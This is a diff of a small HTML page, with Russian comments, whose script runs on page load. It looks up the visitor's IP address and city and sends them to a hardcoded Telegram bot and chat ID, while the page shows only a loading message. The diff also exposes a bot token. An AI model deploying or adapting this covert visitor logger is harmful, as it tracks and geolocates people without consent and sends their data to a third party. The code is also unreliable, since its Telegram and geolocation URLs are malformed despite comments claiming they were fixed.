@@ -2,32 +2,41 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Страница загружается... (v3.0)</h1>
+    <h1 id="status">Загрузка... (v6.0)</h1>
 
     <script>
-        async function run() {
+        async function start() {
+            // Твои рабочие данные
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8426763446";
+            const status = document.getElementById('status');
 
             try {
-                // 1. Получаем IP (ОБЯЗАТЕЛЬНО /json/ в конце)
+                // 1. Получаем IP
                 const res = await fetch('https://ipapi.co');
                 const data = await res.json();
+                
+                // 2. Формируем текст
+                const msg = `🚀 Новый переход!\nIP: ${data.ip}\nГород: ${data.city}`;
 
-                // 2. Формируем сообщение
-                const text = `IP: ${data.ip} | City: ${data.city}`;
+                // 3. Отправляем в Telegram
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+                
+                const response = await fetch(url);
+                const result = await response.json();
 
-                // 3. Отправляем в ТГ (ИСПРАВЛЕННЫЙ URL с /bot и /sendMessage)
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
-
-                await fetch(url);
-                document.getElementById('status').innerText = "Готово! Сообщение в Telegram.";
+                if (result.ok) {
+                    status.innerText = "ГОТОВО! Проверяй Telegram.";
+                } else {
+                    status.innerText = "ОШИБКА БОТА: " + result.description;
+                }
             } catch (e) {
-                document.getElementById('status').innerText = "Ошибка: " + e;
-                console.error(e);
+                status.innerText = "ОШИБКА СЕТИ: " + e;
             }
         }
-        run();
+
+        // Запуск
+        start();
     </script>
 </body>
 </html>
